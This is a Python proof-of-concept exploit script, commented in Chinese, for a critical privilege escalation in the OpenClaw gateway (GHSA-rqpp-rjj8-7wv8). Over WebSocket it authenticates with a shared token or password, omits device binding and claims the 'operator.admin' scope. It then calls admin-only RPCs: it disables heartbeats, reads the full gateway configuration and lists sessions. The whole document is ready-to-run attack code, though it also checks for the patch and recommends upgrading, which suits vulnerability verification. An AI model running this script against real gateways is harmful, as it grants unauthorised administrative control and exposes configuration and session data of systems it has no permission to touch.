#!/usr/bin/env python3
"""
OpenClaw WebSocket Shared-Token Privilege Escalation PoC
========================================================
CVE:  N/A (GHSA-rqpp-rjj8-7wv8)
CVSS: 10.0 Critical
影响版本: OpenClaw <= 2026.3.11
修复版本: OpenClaw 2026.3.12

漏洞说明:
  OpenClaw 网关在处理 WebSocket 共享令牌(shared-token)认证时，
  未对无设备绑定的连接清除客户端自行声明的权限范围(scopes)。
  攻击者可利用共享令牌连接并声明 operator.admin 等管理员权限，
  从而执行仅限管理员的网关操作。

用法:
  python3 poc.py --target ws://127.0.0.1:18789 --token <shared_token>
  python3 poc.py --target ws://127.0.0.1:18789 --password <shared_password>
"""

import argparse
import asyncio
import json
import sys

try:
    import websockets
except ImportError:
    print("[!] 需要安装 websockets 库: pip3 install websockets")
    sys.exit(1)


class OpenClawExploit:
    """OpenClaw WebSocket 权限提升漏洞利用"""

    def __init__(self, target: str, token: str = None, password: str = None):
        self.target = target
        self.token = token
        self.password = password
        self.ws = None
        self.msg_id = 0

    def _next_id(self) -> str:
        self.msg_id += 1
        return str(self.msg_id)

    async def _send_and_recv(self, msg: dict, timeout: int = 10) -> dict:
        """发送 WebSocket 请求并等待匹配 ID 的响应(跳过事件消息)"""
        msg_id = msg.get("id", self._next_id())
        msg["id"] = msg_id
        await self.ws.send(json.dumps(msg))
        deadline = asyncio.get_event_loop().time() + timeout
        while asyncio.get_event_loop().time() < deadline:
            remaining = deadline - asyncio.get_event_loop().time()
            raw = await asyncio.wait_for(
                self.ws.recv(), timeout=max(remaining, 0.1)
            )
            resp = json.loads(raw)
            # 跳过广播事件，只返回匹配 ID 的响应
            if resp.get("type") == "res" and resp.get("id") == msg_id:
                return resp
        return None

    async def connect_gateway(self) -> dict:
        """建立 WebSocket 连接并进行共享令牌/密码认证，同时声明 admin 权限"""
        print(f"[*] 正在连接目标: {self.target}")
        self.ws = await websockets.connect(self.target)
        print("[+] WebSocket 连接建立成功")

        # 等待服务端发送 connect.challenge
        challenge = json.loads(await asyncio.wait_for(self.ws.recv(), timeout=5))
        nonce = challenge.get("payload", {}).get("nonce", "")
        print(f"[+] 收到认证质询 (nonce: {nonce[:16]}...)")

        # 构造认证请求
        # 关键漏洞利用点: scopes 声明 operator.admin + 无设备绑定(省略 device 字段)
        auth_params = {}
        if self.token:
            auth_params["token"] = self.token
            auth_label = "共享令牌"
        elif self.password:
            auth_params["password"] = self.password
            auth_label = "共享密码"

        connect_msg = {
            "type": "req",
            "method": "connect",
            "id": self._next_id(),
            "params": {
                "client": {
                    "id": "cli",
                    "version": "2026.3.11",
                    "mode": "cli",
                    "platform": "linux",
                },
                "minProtocol": 3,
                "maxProtocol": 3,
                "role": "operator",
                "auth": auth_params,
                "scopes": ["operator.admin"],
                # 不提供 device 字段 — 触发无设备绑定路径
            },
        }

        print(f"[*] 使用{auth_label}认证, 声明权限: operator.admin")
        print(f"[*] 发送认证请求:")
        print(f"    method: connect")
        print(f"    auth: {auth_label}")
        print(f"    scopes: [\"operator.admin\"]")
        print(f"    device: <未提供> (无设备绑定)")

        await self.ws.send(json.dumps(connect_msg))

        # 接收连接响应 (可能在事件消息之间)
        resp = json.loads(await asyncio.wait_for(self.ws.recv(), timeout=10))
        return resp

    async def call_rpc(self, method: str, params: dict = None) -> dict:
        """调用网关 RPC 方法"""
        if params is None:
            params = {}
        rpc_msg = {
            "type": "req",
            "method": method,
            "params": params,
        }
        return await self._send_and_recv(rpc_msg)

    async def run(self):
        """执行完整的漏洞利用流程"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║   OpenClaw WebSocket Shared-Token Privilege Escalation PoC  ║
║   GHSA-rqpp-rjj8-7wv8  |  CVSS 10.0 Critical              ║
║   影响版本: OpenClaw <= 2026.3.11                            ║
╚══════════════════════════════════════════════════════════════╝
"""
        print(banner)

        try:
            # ═══════════════════════════════════════════
            # 阶段 1: 建立连接并提升权限
            # ═══════════════════════════════════════════
            print("=" * 60)
            print("[阶段 1] WebSocket 连接 + 共享令牌认证 + 权限声明")
            print("=" * 60)
            connect_resp = await self.connect_gateway()

            if not connect_resp.get("ok"):
                error_msg = connect_resp.get("error", {}).get("message", "未知错误")
                print(f"[-] 认证失败: {error_msg}")
                return False

            server_ver = (
                connect_resp.get("payload", {})
                .get("server", {})
                .get("version", "unknown")
            )
            print(f"[+] 认证成功! 服务端版本: {server_ver}")

            # ═══════════════════════════════════════════
            # 阶段 2: 验证权限提升 — 调用管理员 RPC
            # ═══════════════════════════════════════════
            print("\n" + "=" * 60)
            print("[阶段 2] 验证权限提升 — 调用 operator.admin 级别 RPC")
            print("=" * 60)

            vuln = False

            # 测试 set-heartbeats (需要 operator.admin 权限)
            print("\n[*] 调用 set-heartbeats (需要 operator.admin)")
            resp = await self.call_rpc("set-heartbeats", {"enabled": False})
            if resp and resp.get("ok"):
                print("[+] set-heartbeats 调用成功!")
                vuln = True
            elif resp:
                err = resp.get("error", {}).get("message", "")
                print(f"[-] 调用失败: {err}")
                if "missing scope" in err.lower():
                    print("[*] scopes 已被清除 — 目标已修补此漏洞")

            # 测试 config.get (获取完整网关配置)
            print("\n[*] 调用 config.get (读取网关配置)")
            resp = await self.call_rpc("config.get", {})
            if resp and resp.get("ok"):
                print("[+] config.get 调用成功! 已获取完整网关配置")
                config_str = json.dumps(resp.get("payload", {}))
                # 显示配置片段(截断敏感信息)
                print(f"    配置大小: {len(config_str)} bytes")
                vuln = True
            elif resp:
                err = resp.get("error", {}).get("message", "")
                print(f"[-] 调用失败: {err}")

            # 测试 sessions.list (列举所有会话)
            print("\n[*] 调用 sessions.list (列举会话)")
            resp = await self.call_rpc("sessions.list", {})
            if resp and resp.get("ok"):
                print("[+] sessions.list 调用成功!")
                vuln = True
            elif resp:
                err = resp.get("error", {}).get("message", "")
                print(f"[-] 调用失败: {err}")

            # ═══════════════════════════════════════════
            # 结论
            # ═══════════════════════════════════════════
            print("\n" + "=" * 60)
            if vuln:
                print("[!!!] 漏洞利用成功 — 权限提升已确认!")
                print(f"[!!!] 目标 {self.target} 存在 GHSA-rqpp-rjj8-7wv8")
                print("[!!!] 共享令牌用户通过声明 operator.admin 获得管理员权限")
                print("[建议] 请立即升级至 OpenClaw >= 2026.3.12")
            else:
                print("[结论] 目标不受此漏洞影响 (已修补或配置不同)")
            print("=" * 60)

            return vuln

        except websockets.exceptions.ConnectionClosed as e:
            print(f"[-] WebSocket 连接被关闭: {e}")
            return False
        except asyncio.TimeoutError:
            print("[-] 等待响应超时")
            return False
        except ConnectionRefusedError:
            print(f"[-] 无法连接到目标: {self.target}")
            print("[-] 请确认目标地址和端口正确, 且 OpenClaw 网关正在运行")
            return False
        except Exception as e:
            print(f"[-] 发生异常: {type(e).__name__}: {e}")
            return False
        finally:
            if self.ws:
                await self.ws.close()
                print("\n[*] WebSocket 连接已关闭")


def main():
    parser = argparse.ArgumentParser(
        description="OpenClaw WebSocket Shared-Token Privilege Escalation PoC (GHSA-rqpp-rjj8-7wv8)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 使用共享令牌
  python3 poc.py --target ws://127.0.0.1:18789 --token my_shared_token

  # 使用共享密码
  python3 poc.py --target ws://127.0.0.1:18789 --password my_shared_password

  # 指定自定义端口
  python3 poc.py --target ws://192.168.1.100:8080 --token secret
        """,
    )

    parser.add_argument(
        "--target", "-t",
        default="ws://127.0.0.1:18789",
        help="目标 WebSocket 地址 (默认: ws://127.0.0.1:18789)",
    )

    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("--token", help="共享令牌 (shared token)")
    auth_group.add_argument("--password", "-p", help="共享密码 (shared password)")

    args = parser.parse_args()

    exploit = OpenClawExploit(
        target=args.target,
        token=args.token,
        password=args.password,
    )

    result = asyncio.run(exploit.run())
    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
